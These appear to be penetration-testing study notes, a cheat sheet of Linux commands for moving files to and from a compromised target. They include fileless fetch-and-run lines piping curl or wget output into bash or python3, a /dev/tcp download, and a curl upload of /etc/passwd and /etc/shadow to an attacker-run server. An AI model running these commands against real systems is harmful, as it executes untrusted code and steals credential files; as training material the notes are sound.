
# Download Operations

### Base64 Encoding / Decoding

- **Pwnbox - Check MD5 hash**
	- `md5sum <file>`
- **Pwnbox - Encode File to Base64**
	- `cat <file> | base64 -w 0; echo`
- **Linux Target - Decode**
	- Copy and paste
	- `echo -n <base64> | base64 -d > <file>`
- **Linux - Confirm Hash**
	- `md5sum <file>`

### Web Downloads with Wget and cURL
- **wget**
	- `wget <URL> -O /path/to/outfile`
- **cURL**
	- `curl -o /path/to/outfile <URL>`

### Fileless Attacks Using Linux
- We can use pipes to replicate fileless operations
- Some payloads, like mkfifo, write files to disk. Payload execution may be fileless but may write temporary files to disk.

- **Fileless Download with cURL**
	- `curl <URL> | bash`
- **Fileless Download with wget**
	- `wget -qO- <URL> | python3`

### Download with Bash
- If the regular tools are not available we can use Bash v 2.04+ and it's built-in /dev/TCP device file for simple downloads.

- **Connect to the Target Webserver**
	- `exec 3<>/dev/tcp/<IP>/<PORT>`
- **HTTP GET Request**
	- `echo -e "Get /File.sh HTTP/1.1\n\n">&3`
- **Print the Response**
	- `cat <&3`

### SSH Downloads
- **Make sure SSH is enabled and started**
	- `sudo systemctl enable ssh`
	- `sudo systemctl start ssh`
- **On Target - Download Files Using SCP**
	- `scp username@from_host:file.txt .`

___

# Upload Operations

### Web Upload
- **Pwnbox - Start Upload Server**
	- `python3 -m pip install --user uploadserver`
- **Pwnbox - Create a Self-Signed Certificate**
	- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
	- Don't host the certificate!!
- **Pwnbox - Start Web Server**
	- `python3 -m uploadserver 443 --server-certificate /root/server.pem`
- **Linux Target - Upload Multiple Files**
	- `curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

### Alternate Web File Transfer Method
- The alternate method is to start a mini webserver on the target and download it via wget.
- **Creating Web Servers**
	- Python3
		- `python3 -m http.server`
	- Python2.7
		- `python2.7 -m SimpleHTTPServer`
	- PHP
		- `php -S 0.0.0.0:8000`
	- Ruby
		- `ruby -run -ehttpd . -p8000`

### SCP Upload
	- `scp /some/loot user@<IP>:/home/user/`